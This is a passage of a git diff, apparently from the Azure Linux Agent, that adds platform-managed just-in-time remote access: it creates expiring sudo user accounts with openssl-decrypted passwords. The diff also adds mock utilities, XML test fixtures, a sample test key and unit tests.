remote_access_user\n+\n+class UserAccount(object):\n+    \"\"\"\n+    Stores information about single user account\n+    \"\"\"\n+    def __init__(self):\n+        self.Name = None\n+        self.EncryptedPassword = None\n+        self.Password = None\n+        self.Expiration = None\n+        self.Groups = []\n+\n+\n class Certificates(object):\n     \"\"\"\n     Object containing certificates of host and provisioned user.\ndiff --git a/azurelinuxagent/common/utils/cryptutil.py b/azurelinuxagent/common/utils/cryptutil.py\nindex f038d0fc0..348614236 100644\n--- a/azurelinuxagent/common/utils/cryptutil.py\n+++ b/azurelinuxagent/common/utils/cryptutil.py\n@@ -19,12 +19,18 @@\n \n import base64\n import struct\n+import sys\n+import os.path\n+import subprocess\n \n from azurelinuxagent.common.future import ustr, bytebuffer\n from azurelinuxagent.common.exception import CryptError\n \n import azurelinuxagent.common.logger as logger\n import azurelinuxagent.common.utils.shellutil as shellutil\n+import azurelinuxagent.common.utils.textutil as textutil\n+\n+DECRYPT_SECRET_CMD = \"{0} cms -decrypt -inform DER -inkey {1} -in /dev/stdin\"\n \n class CryptUtil(object):\n     def __init__(self, openssl_cmd):\n@@ -128,3 +134,16 @@ def bits_to_bytes(self, bits):\n                 index = 7\n         return bytes(byte_array)\n \n+    def decrypt_secret(self, encrypted_password, private_key):\n+        try:\n+            decoded = base64.b64decode(encrypted_password)\n+        except Exception as e:\n+            raise CryptError(\"Error decoding secret\", e)\n+        args = DECRYPT_SECRET_CMD.format(self.openssl_cmd, private_key).split(' ')\n+        p = subprocess.Popen(args, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)\n+        p.stdin.write(decoded)\n+        output = p.communicate()[0]\n+        retcode = p.poll()\n+        if retcode:\n+            raise subprocess.CalledProcessError(retcode, \"openssl cms -decrypt\", output=output)\n+        return output.decode('utf-16')\ndiff --git a/azurelinuxagent/ga/remoteaccess.py b/azurelinuxagent/ga/remoteaccess.py\nnew file mode 100644\nindex 000000000..9be2176b9\n--- /dev/null\n+++ b/azurelinuxagent/ga/remoteaccess.py\n@@ -0,0 +1,162 @@\n+# Microsoft Azure Linux Agent\n+#\n+# Copyright Microsoft Corporation\n+#\n+# Licensed under the Apache License, Version 2.0 (the \"License\");\n+# you may not use this file except in compliance with the License.\n+# You may obtain a copy of the License at\n+#\n+#     http://www.apache.org/licenses/LICENSE-2.0\n+#\n+# Unless required by applicable law or agreed to in writing, software\n+# distributed under the License is distributed on an \"AS IS\" BASIS,\n+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+# See the License for the specific language governing permissions and\n+# limitations under the License.\n+#\n+# Requires Python 2.6+ and Openssl 1.0+\n+#\n+\n+import datetime\n+import glob\n+import json\n+import operator\n+import os\n+import os.path\n+import pwd\n+import random\n+import re\n+import shutil\n+import stat\n+import subprocess\n+import textwrap\n+import time\n+import traceback\n+import zipfile\n+\n+import azurelinuxagent.common.conf as conf\n+import azurelinuxagent.common.logger as logger\n+import azurelinuxagent.common.utils.fileutil as fileutil\n+import azurelinuxagent.common.version as version\n+import azurelinuxagent.common.protocol.wire\n+import azurelinuxagent.common.protocol.metadata as metadata\n+\n+from datetime import datetime, timedelta\n+from pwd import getpwall\n+from azurelinuxagent.common.errorstate import ErrorState\n+\n+from azurelinuxagent.common.event import add_event, WALAEventOperation, elapsed_milliseconds\n+from azurelinuxagent.common.exception import ExtensionError, ProtocolError\n+from azurelinuxagent.common.future import ustr\n+from azurelinuxagent.common.protocol.restapi import ExtHandlerStatus, \\\n+                                                    ExtensionStatus, \\\n+                                                    ExtensionSubStatus, \\\n+                                                    VMStatus, ExtHandler, \\\n+                                                    get_properties, \\\n+                                                    set_properties\n+from azurelinuxagent.common.protocol.metadata import MetadataProtocol\n+from azurelinuxagent.common.utils.cryptutil import CryptUtil\n+from azurelinuxagent.common.utils.flexible_version import FlexibleVersion\n+from azurelinuxagent.common.utils.processutil import capture_from_process\n+from azurelinuxagent.common.protocol import get_protocol_util\n+from azurelinuxagent.common.version import AGENT_NAME, CURRENT_VERSION\n+from azurelinuxagent.common.osutil import get_osutil\n+\n+REMOTE_USR_EXPIRATION_FORMAT = \"%a, %d %b %Y %H:%M:%S %Z\"\n+DATE_FORMAT = \"%Y-%m-%d\"\n+TRANSPORT_PRIVATE_CERT = \"TransportPrivate.pem\"\n+REMOTE_ACCESS_ACCOUNT_COMMENT = \"JIT_Account\"\n+MAX_TRY_ATTEMPT = 5\n+FAILED_ATTEMPT_THROTTLE = 1\n+\n+def get_remote_access_handler():\n+    return RemoteAccessHandler()\n+\n+class RemoteAccessHandler(object):\n+    def __init__(self):\n+        self.os_util = get_osutil()\n+        self.protocol_util = get_protocol_util()\n+        self.protocol = None\n+        self.cryptUtil = CryptUtil(conf.get_openssl_cmd())\n+        self.remote_access = None\n+        self.incarnation = 0\n+\n+    def run(self):\n+        try:\n+            if self.os_util.jit_enabled:\n+                self.protocol = self.protocol_util.get_protocol()\n+                current_incarnation = self.protocol.get_incarnation()\n+                if self.incarnation != current_incarnation:\n+                    # something changed. Handle remote access if any.\n+                    self.incarnation = current_incarnation\n+                    self.remote_access = self.protocol.client.get_remote_access()\n+                    if self.remote_access is not None:\n+                        self.handle_remote_access()\n+        except Exception as e:\n+            msg = u\"Exception processing remote access handler: {0} {1}\".format(ustr(e), traceback.format_exc())\n+            logger.error(msg)\n+            add_event(AGENT_NAME,\n+                      version=CURRENT_VERSION,\n+                      op=WALAEventOperation.RemoteAccessHandling,\n+                      is_success=False,\n+                      message=msg)\n+\n+    def handle_remote_access(self):\n+        if self.remote_access is not None:\n+            # Get JIT user accounts.\n+            all_users = self.os_util.get_users()\n+            jit_users = set()\n+            for usr in all_users:\n+                if self.validate_jit_user(usr[4]):\n+                    jit_users.add(usr[0])\n+            for acc in self.remote_access.user_list.users:\n+                raw_expiration = acc.expiration\n+                account_expiration = datetime.strptime(raw_expiration, REMOTE_USR_EXPIRATION_FORMAT)\n+                now = datetime.utcnow()\n+                if acc.name not in jit_users and now < account_expiration:\n+                    self.add_user(acc.name, acc.encrypted_password, account_expiration)\n+\n+    def validate_jit_user(self, comment):\n+        return comment == REMOTE_ACCESS_ACCOUNT_COMMENT\n+\n+    def add_user(self, username, encrypted_password, account_expiration):\n+        try:\n+            expiration_date = (account_expiration + timedelta(days=1)).strftime(DATE_FORMAT)\n+            logger.verbose(\"Adding user {0} with expiration date {1}\"\n+                           .format(username, expiration_date))\n+            self.os_util.useradd(username, expiration_date, REMOTE_ACCESS_ACCOUNT_COMMENT)\n+        except OSError as oe:\n+            logger.error(\"Error adding user {0}. {1}\"\n+                         .format(username, oe.strerror))\n+            return\n+        except Exception as e:\n+            logger.error(\"Error adding user {0}. {1}\".format(username, ustr(e)))\n+            return\n+        try:\n+            prv_key = os.path.join(conf.get_lib_dir(), TRANSPORT_PRIVATE_CERT)\n+            pwd = self.cryptUtil.decrypt_secret(encrypted_password, prv_key)\n+            self.os_util.chpasswd(username, pwd, conf.get_password_cryptid(), conf.get_password_crypt_salt_len())\n+            self.os_util.conf_sudoer(username)\n+            logger.info(\"User '{0}' added successfully with expiration in {1}\"\n+                        .format(username, expiration_date))\n+            return\n+        except OSError as oe:\n+            self.handle_failed_create(username, oe.strerror)\n+        except Exception as e:\n+            self.handle_failed_create(username, ustr(e))\n+\n+    def handle_failed_create(self, username, error_message):\n+        logger.error(\"Error creating user {0}. {1}\"\n+                     .format(username, error_message))\n+        try:\n+            self.delete_user(username)\n+        except OSError as oe:\n+            logger.error(\"Failed to clean up after account creation for {0}. {1}\"\n+                         .format(username, oe.strerror()))\n+        except Exception as e:\n+            logger.error(\"Failed to clean up after account creation for {0}. {1}\"\n+                         .format(username, str(e)))\n+\n+    def delete_user(self, username):\n+        self.os_util.del_account(username)\n+        logger.info(\"User deleted {0}\".format(username))\ndiff --git a/azurelinuxagent/ga/update.py b/azurelinuxagent/ga/update.py\nindex 7d0cee06e..47358e487 100644\n--- a/azurelinuxagent/ga/update.py\n+++ b/azurelinuxagent/ga/update.py\n@@ -261,6 +261,9 @@ def run(self):\n             exthandlers_handler = get_exthandlers_handler()\n             migrate_handler_state()\n \n+            from azurelinuxagent.ga.remoteaccess import get_remote_access_handler\n+            remote_access_handler = get_remote_access_handler()\n+\n             self._ensure_no_orphans()\n             self._emit_restart_event()\n             self._ensure_partition_assigned()\n@@ -298,6 +301,8 @@ def run(self):\n                 last_etag = exthandlers_handler.last_etag\n                 exthandlers_handler.run()\n \n+                remote_access_handler.run()\n+\n                 if last_etag != exthandlers_handler.last_etag:\n                     self._ensure_readonly_files()\n                     add_event(\ndiff --git a/tests/common/osutil/mock_osutil.py b/tests/common/osutil/mock_osutil.py\nnew file mode 100644\nindex 000000000..267bdbfcb\n--- /dev/null\n+++ b/tests/common/osutil/mock_osutil.py\n@@ -0,0 +1,53 @@\n+# Copyright Microsoft Corporation\n+#\n+# Licensed under the Apache License, Version 2.0 (the \"License\");\n+# you may not use this file except in compliance with the License.\n+# You may obtain a copy of the License at\n+#\n+#     http://www.apache.org/licenses/LICENSE-2.0\n+#\n+# Unless required by applicable law or agreed to in writing, software\n+# distributed under the License is distributed on an \"AS IS\" BASIS,\n+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+# See the License for the specific language governing permissions and\n+# limitations under the License.\n+#\n+# Requires Python 2.6+ and Openssl 1.0+\n+#\n+\n+from azurelinuxagent.common.osutil.default import DefaultOSUtil\n+\n+class MockOSUtil(DefaultOSUtil):\n+    def __init__(self):\n+        self.all_users = {}\n+        self.sudo_users = set()\n+        self.jit_enabled = True\n+\n+    def useradd(self, username, expiration=None, comment=None):\n+        if username == \"\":\n+            raise Exception(\"test exception for bad username\")\n+        if username in self.all_users:\n+            raise Exception(\"test exception, user already exists\")\n+        self.all_users[username] = (username, None, None, None, comment, None, None, expiration)\n+\n+    def conf_sudoer(self, username, nopasswd=False, remove=False):\n+        if not remove:\n+            self.sudo_users.add(username)\n+        else:\n+            self.sudo_users.remove(username)\n+\n+    def chpasswd(self, username, password, crypt_id=6, salt_len=10):\n+        if password == \"\":\n+            raise Exception(\"test exception for bad password\")\n+        user = self.all_users[username]\n+        self.all_users[username] = (user[0], password, user[2], user[3], user[4], user[5], user[6], user[7])\n+\n+    def del_account(self, username):\n+        if username == \"\":\n+            raise Exception(\"test exception, bad data\")\n+        if username not in self.all_users:\n+            raise Exception(\"test exception, user does not exist to delete\")\n+        self.all_users.pop(username)\n+\n+    def get_users(self):\n+        return self.all_users.values()\n\\ No newline at end of file\ndiff --git a/tests/data/wire/encrypted.enc b/tests/data/wire/encrypted.enc\nnew file mode 100644\nindex 000000000..e2d5b25d6\n--- /dev/null\n+++ b/tests/data/wire/encrypted.enc\n@@ -0,0 +1,9 @@\n+MIIBlwYJKoZIhvcNAQcDoIIBiDCCAYQCAQIxggEwMIIBLAIBAoAUW4P+tNXlmDXW\n+H30raKBkpUhXYwUwDQYJKoZIhvcNAQEBBQAEggEAP0LpwacLdJyvNQVmSyXPGM0i\n+mNJSHPQsAXLFFcmWmCAGiEsQWiHKV9mON/eyd6DjtgbTuhVNHPY/IDSDXfjgLxdX\n+NK1XejuEaVTwdVtCJWl5l4luOeCMDueitoIgBqgkbFpteqV6s8RFwnv+a2HhM0lc\n+TUwim6skx1bFs0csDD5DkM7R10EWxWHjdKox8R8tq/C2xpaVWRvJ52/DCVgeHOfh\n+orV0GmBK0ue/mZVTxu8jz2BxQUBhHXNWjBuNuGNmUuZvD0VY1q2K6Fa3xzv32mfB\n+xPKgt6ru/wG1Kn6P8yMdKS3bQiNZxE1D1o3epDujiygQahUby5cI/WXk7ryZ1DBL\n+BgkqhkiG9w0BBwEwFAYIKoZIhvcNAwcECAxpp+ZE6rpAgChqxBVpU047fb4zinTV\n+5xaG7lN15YEME4q8CqcF/Ji3NbHPmdw1/gtf\ndiff --git a/tests/data/wire/goal_state_remote_access.xml b/tests/data/wire/goal_state_remote_access.xml\nnew file mode 100644\nindex 000000000..ba46ce2ae\n--- /dev/null\n+++ b/tests/data/wire/goal_state_remote_access.xml\n@@ -0,0 +1,30 @@\n+<?xml version=\"1.0\" encoding=\"utf-8\"?>\n+<GoalState xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceSchemaLocation=\"goalstate10.xsd\">\n+   <Version>2010-12-15</Version>\n+   <Incarnation>1</Incarnation>\n+   <Machine>\n+     <ExpectedState>Started</ExpectedState>\n+     <LBProbePorts>\n+       <Port>16001</Port>\n+     </LBProbePorts>\n+   </Machine>\n+   <Container>\n+     <ContainerId>c6d5526c-5ac2-4200-b6e2-56f2b70c5ab2</ContainerId>\n+     <RemoteAccessInfo>http://remoteaccessinfouri/\n+     </RemoteAccessInfo>\n+     <RoleInstanceList>\n+       <RoleInstance>\n+         <InstanceId>MachineRole_IN_0</InstanceId>\n+         <State>Started</State>\n+         <Configuration>\n+         <HostingEnvironmentConfig>http://hostingenvuri/</HostingEnvironmentConfig>\n+         <SharedConfig>http://sharedconfiguri/</SharedConfig>\n+         <Certificates>http://certificatesuri/</Certificates>\n+         <ExtensionsConfig>http://extensionsconfiguri/</ExtensionsConfig>\n+         <FullConfig>http://fullconfiguri/</FullConfig>\n+         <ConfigName>DummyRoleConfigName.xml</ConfigName>\n+         </Configuration>\n+       </RoleInstance>\n+     </RoleInstanceList>\n+   </Container>\n+ </GoalState>\n\\ No newline at end of file\ndiff --git a/tests/data/wire/remote_access_10_accounts.xml b/tests/data/wire/remote_access_10_accounts.xml\nnew file mode 100644\nindex 000000000..c12efb047\n--- /dev/null\n+++ b/tests/data/wire/remote_access_10_accounts.xml\n@@ -0,0 +1,97 @@\n+<?xml version=\"1.0\" encoding=\"utf-8\"?>\n+<RemoteAccess>\n+    <Version>1</Version>\n+    <Incarnation>1</Incarnation>\n+    <Users>\n+        <User>\n+            <Name>testAccount1</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount2</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount3</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount4</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount5</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount6</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount7</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount8</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount9</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount10</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+    </Users>\n+</RemoteAccess>\n\\ No newline at end of file\ndiff --git a/tests/data/wire/remote_access_duplicate_accounts.xml b/tests/data/wire/remote_access_duplicate_accounts.xml\nnew file mode 100644\nindex 000000000..de8b3ced7\n--- /dev/null\n+++ b/tests/data/wire/remote_access_duplicate_accounts.xml\n@@ -0,0 +1,25 @@\n+<?xml version=\"1.0\" encoding=\"utf-8\"?>\n+<RemoteAccess>\n+    <Version>1</Version>\n+    <Incarnation>1</Incarnation>\n+    <Users>\n+        <User>\n+            <Name>testAccount</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+    </Users>\n+</RemoteAccess>\n\\ No newline at end of file\ndiff --git a/tests/data/wire/remote_access_no_accounts.xml b/tests/data/wire/remote_access_no_accounts.xml\nnew file mode 100644\nindex 000000000..427241a26\n--- /dev/null\n+++ b/tests/data/wire/remote_access_no_accounts.xml\n@@ -0,0 +1,6 @@\n+<?xml version=\"1.0\" encoding=\"utf-8\"?>\n+<RemoteAccess>\n+    <Version>1</Version>\n+    <Incarnation>1</Incarnation>\n+    <Users />\n+</RemoteAccess>\n\\ No newline at end of file\ndiff --git a/tests/data/wire/remote_access_single_account.xml b/tests/data/wire/remote_access_single_account.xml\nnew file mode 100644\nindex 000000000..5471d7ca4\n--- /dev/null\n+++ b/tests/data/wire/remote_access_single_account.xml\n@@ -0,0 +1,16 @@\n+<?xml version=\"1.0\" encoding=\"utf-8\"?>\n+<RemoteAccess>\n+    <Version>1</Version>\n+    <Incarnation>1</Incarnation>\n+    <Users>\n+        <User>\n+            <Name>testAccount</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+    </Users>\n+</RemoteAccess>\n\\ No newline at end of file\ndiff --git a/tests/data/wire/remote_access_two_accounts.xml b/tests/data/wire/remote_access_two_accounts.xml\nnew file mode 100644\nindex 000000000..994492c36\n--- /dev/null\n+++ b/tests/data/wire/remote_access_two_accounts.xml\n@@ -0,0 +1,25 @@\n+<?xml version=\"1.0\" encoding=\"utf-8\"?>\n+<RemoteAccess>\n+    <Version>1</Version>\n+    <Incarnation>1</Incarnation>\n+    <Users>\n+        <User>\n+            <Name>testAccount1</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+        <User>\n+            <Name>testAccount2</Name>\n+            <Password>encryptedPasswordString</Password>\n+            <Expiration>2019-01-01</Expiration>\n+            <Groups>\n+                <GroupName>Administrators</GroupName>\n+                <GroupName>RemoteDesktopUsers</GroupName>\n+            </Groups>\n+        </User>\n+    </Users>\n+</RemoteAccess>\n\\ No newline at end of file\ndiff --git a/tests/data/wire/sample.pem b/tests/data/wire/sample.pem\nnew file mode 100644\nindex 000000000..ff4b58b32\n--- /dev/null\n+++ b/tests/data/wire/sample.pem\n@@ -0,0 +1,28 @@\n+-----BEGIN PRIVATE KEY-----\n+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC3zCdThkBDYu83\n+M7ouc03caqyEwV6lioWbtYdnraoftbuCJrOhy+WipSCVAmhlu/tpaItuzwB9/VTw\n+eSWfB/hB2sabVTKgU8gTQrI6ISy2ocLjqTIZuOETJuGlAIw6OXorhdUr8acZ8ohb\n+ftZIbS9YKxbO7sQi+20sT2ugROJnO7IDGbb2vWhEhp2NAieJ8Nnq0SMv1+cZJZYk\n+6hiFVSl12g0egVFrRTJBvvTbPS7amLAQkauK/IxG28jZR61pMbHHX+xBg4Iayb2i\n+qp8YnwK3qtf0stc0h9snnLnHSODva1Bo6qVBEcrkuXmtrHL2nUMsV/MgWG3HMgJJ\n+6Jf/wSFpAgMBAAECggEBALepsS6cvADajzK5ZPXf0NFOY6CxXnPLrWGAj5NCDftr\n+7bjMFbq7dngFzD46zrnClCOsDZEoF1TO3p8CYF6/Zwvfo5E7HMDrl8XvYwwFdJn3\n+oTlALMlZXsh1lQv+NSJFp1hwfylPbGzYV/weDeEIAkR3om4cWDCg0GJz5peb3iXK\n+5fimrZsnInhktloU2Ep20UepR8wbhS5WP7B2s32OULTlWiGdORUVrHJQbTN6O0NZ\n+WzmAcsgfmW1KEBOR9sDFbAdldt8/WcLJVIfWOdFVbCbOaxrnRnZ8j8tsafziVncD\n+QFRpNeyOHZR5S84oAPo2EIVeFCLLeo3Wit/O3IFmhhUCgYEA5jrs0VSowb/xU/Bw\n+wm1cKnSqsub3p3GLPL4TdODYMHH56Wv8APiwcW9O1+oRZoM9M/8KXkDlfFOz10tY\n+bMYvF8MzFKIzzi5TxaWqSWsNeXpoqtFqUed7KRh3ybncIqFAAauTwmAhAlEmGR/e\n+AY7Oy4b2lnRU1ssIOd0VnSnAqTcCgYEAzF6746DhsInlFIQGsUZBOmUtwyu0k1kc\n+gkWhJt5SyQHZtX1SMV2RI6CXFpUZcjv31jM30GmXdvkuj2dIHaDZB5V5BlctPJZq\n+FH0RFxmFHXk+npLJnKKSX1H3/2PxTUsSBcFHEaPCgvIz3720bX7fqRIFtVdrcbQA\n+cB9DARbjWl8CgYBKADyoWCbaB+EA0vLbe505RECtulF176gKgSnt0muKvsfOQFhC\n+06ya+WUFP4YSRjLA6MQjYYahvKG8nMoyRE1UvPhJNI2kQv3INKSUbqVpG3BTH3am\n+Ftpebi/qliPsuZnCL60RuCZEAWNWhgisxYMwphPSblfqpl3hg290EbyMZwKBgQCs\n+mypHQ166EozW+fcJDFQU9NVkrGoTtMR+Rj6oLEdxG037mb+sj+EAXSaeXQkj0QAt\n++g4eyL+zLRuk5E8lLu9+F0EjGMfNDyDC8ypW/yfNT9SSa1k6IJhNR1aUbZ2kcU3k\n+bGwQuuWSYOttAbT8cZaHHgCSOyY03xkrmUunBOS6MwKBgBK4D0Uv7ZDf3Y38A07D\n+MblDQj3wZeFu6IWi9nVT12U3WuEJqQqqxWnWmETa+TS/7lhd0GjTB+79+qOIhmls\n+XSAmIS/rBUGlk5f9n+vBjQkpbqAvcXV7I/oQASpVga1xB9EuMvXc9y+x/QfmrYVM\n+zqxRWJIMASPLiQr79V0zXGXP\n+-----END PRIVATE KEY-----\n\\ No newline at end of file\ndiff --git a/tests/ga/test_remoteaccess.py b/tests/ga/test_remoteaccess.py\nnew file mode 100644\nindex 000000000..87eb64c54\n--- /dev/null\n+++ b/tests/ga/test_remoteaccess.py\n@@ -0,0 +1,94 @@\n+# Copyright Microsoft Corporation\n+#\n+# Licensed under the Apache License, Version 2.0 (the \"License\");\n+# you may not use this file except in compliance with the License.\n+# You may obtain a copy of the License at\n+#\n+#     http://www.apache.org/licenses/LICENSE-2.0\n+#\n+# Unless required by applicable law or agreed to in writing, software\n+# distributed under the License is distributed on an \"AS IS\" BASIS,\n+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+# See the License for the specific language governing permissions and\n+# limitations under the License.\n+#\n+# Requires Python 2.6+ and Openssl 1.0+\n+#\n+import xml\n+\n+from tests.tools import *\n+from azurelinuxagent.common.protocol.wire import *\n+from azurelinuxagent.common.osutil import get_osutil\n+\n+class TestRemoteAccess(AgentTestCase):\n+    def test_parse_remote_access(self):\n+        data_str = load_data('wire/remote_access_single_account.xml')\n+        remote_access = RemoteAccess(data_str)\n+        self.assertNotEquals(None, remote_access)\n+        self.assertEquals(\"1\", remote_access.incarnation)\n+        self.assertEquals(1, len(remote_access.user_list.users), \"User count does not match.\")\n+        self.assertEquals(\"testAccount\", remote_access.user_list.users[0].name, \"Account name does not match\")\n+        self.assertEquals(\"encryptedPasswordString\", remote_access.user_list.users[0].encrypted_password, \"Encrypted password does not match.\")\n+        self.assertEquals(\"2019-01-01\", remote_access.user_list.users[0].expiration, \"Expiration does not match.\")\n+\n+    @patch('azurelinuxagent.common.protocol.wire.WireClient.get_goal_state',\n+    return_value=GoalState(load_data('wire/goal_state.xml')))\n+    def test_update_remote_access_conf_no_remote_access(self, _):\n+        protocol = WireProtocol('12.34.56.78')\n+        goal_state = protocol.client.get_goal_state()\n+        protocol.client.update_remote_access_conf(goal_state)\n+\n+    def test_parse_two_remote_access_accounts(self):\n+        data_str = load_data('wire/remote_access_two_accounts.xml')\n+        remote_access = RemoteAccess(data_str)\n+        self.assertNotEquals(None, remote_access)\n+        self.assertEquals(\"1\", remote_access.incarnation)\n+        self.assertEquals(2, len(remote_access.user_list.users), \"User count does not match.\")\n+        self.assertEquals(\"testAccount1\", remote_access.user_list.users[0].name, \"Account name does not match\")\n+        self.assertEquals(\"encryptedPasswordString\", remote_access.user_list.users[0].encrypted_password, \"Encrypted password does not match.\")\n+        self.assertEquals(\"2019-01-01\", remote_access.user_list.users[0].expiration, \"Expiration does not match.\")\n+        self.assertEquals(\"testAccount2\", remote_access.user_list.users[1].name, \"Account name does not match\")\n+        self.assertEquals(\"encryptedPasswordString\", remote_access.user_list.users[1].encrypted_password, \"Encrypted password does not match.\")\n+        self.assertEquals(\"2019-01-01\", remote_access.user_list.users[1].expiration, \"Expiration does not match.\")\n+\n+    def test_parse_ten_remote_access_accounts(self):\n+        data_str = load_data('wire/remote_access_10_accounts.xml')\n+        remote_access = RemoteAccess(data_str)\n+        self.assertNotEquals(None, remote_access)\n+        self.assertEquals(10, len(remote_access.user_list.users), \"User count does not match.\")\n+    \n+    def test_parse_duplicate_remote_access_accounts(self):\n+        data_str = load_data('wire/remote_access_duplicate_accounts.xml')\n+        remote_access = RemoteAccess(data_str)\n+        self.assertNotEquals(None, remote_access)\n+        self.assertEquals(2, len(remote_access.user_list.users), \"User count does not match.\")\n+        self.assertEquals(\"testAccount\", remote_access.user_list.users[0].name, \"Account name does not match\")\n+        self.assertEquals(\"encryptedPasswordString\", remote_access.user_list.users[0].encrypted_password, \"Encrypted password does not match.\")\n+        self.assertEquals(\"2019-01-01\", remote_access.user_list.users[0].expiration, \"Expiration does not match.\")\n+        self.assertEquals(\"testAccount\", remote_access.user_list.users[1].name, \"Account name does not match\")\n+        self.assertEquals(\"encryptedPasswordString\", remote_access.user_list.users[1].encrypted_password, \"Encrypted password does not match.\")\n+        self.assertEquals(\"2019-01-01\", remote_access.user_list.users[1].expiration, \"Expiration does not match.\")\n+\n+    def test_parse_zero_remote_access_accounts(self):\n+        data_str = load_data('wire/remote_access_no_accounts.xml')\n+        remote_access = RemoteAccess(data_str)\n+        self.assertNotEquals(None, remote_access)\n+        self.assertEquals(0, len(remote_access.user_list.users), \"User count does not match.\")\n+\n+    @patch('azurelinuxagent.common.protocol.wire.WireClient.get_goal_state',\n+    return_value=GoalState(load_data('wire/goal_state_remote_access.xml')))\n+    @patch('azurelinuxagent.common.protocol.wire.WireClient.fetch_config',\n+    return_value=load_data('wire/remote_access_single_account.xml'))\n+    @patch('azurelinuxagent.common.protocol.wire.WireClient.get_header_for_cert')\n+    def test_update_remote_access_conf_remote_access(self, _1, _2, _3):\n+        protocol = WireProtocol('12.34.56.78')\n+        goal_state = protocol.client.get_goal_state()\n+        protocol.client.update_remote_access_conf(goal_state)\n+        self.assertNotEquals(None, protocol.client.remote_access)\n+        self.assertEquals(1, len(protocol.client.remote_access.user_list.users))\n+        self.assertEquals('testAccount', protocol.client.remote_access.user_list.users[0].name)\n+        self.assertEquals('encryptedPasswordString', protocol.client.remote_access.user_list.users[0].encrypted_password)\n+\n+    def test_parse_bad_remote_access_data(self):\n+        data = \"foobar\"\n+        self.assertRaises(xml.parsers.expat.ExpatError, RemoteAccess, data)\n\\ No newline at end of file\ndiff --git a/tests/ga/test_remoteaccess_handler.py b/tests/ga/test_remoteaccess_handler.py\nnew file mode 100644\nindex 000000000..d01473519\n--- /dev/null\n+++ b/tests/ga/test_remoteaccess_handler.py\n@@ -0,0 +1,397 @@\n+# Copyright Microsoft Corporation\n+#\n+# Licensed under the Apache License, Version 2.0 (the \"License\");\n+# you may not use this file except in compliance with the License.\n+# You may obtain a copy of the License at\n+#\n+#     http://www.apache.org/licenses/LICENSE-2.0\n+#\n+# Unless required by applicable law or agreed to in writing, software\n+# distributed under the License is distributed on an \"AS IS\" BASIS,\n+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+# See the License for the specific language governing permissions and\n+# limitations under the License.\n+#\n+# Requires Python 2.6+ and Openssl 1.0+\n+#\n+\n+from datetime import timedelta\n+from azurelinuxagent.common.protocol.wire import *\n+from azurelinuxagent.ga.remoteaccess import RemoteAccessHandler\n+from tests.common.osutil.mock_osutil import MockOSUtil\n+from 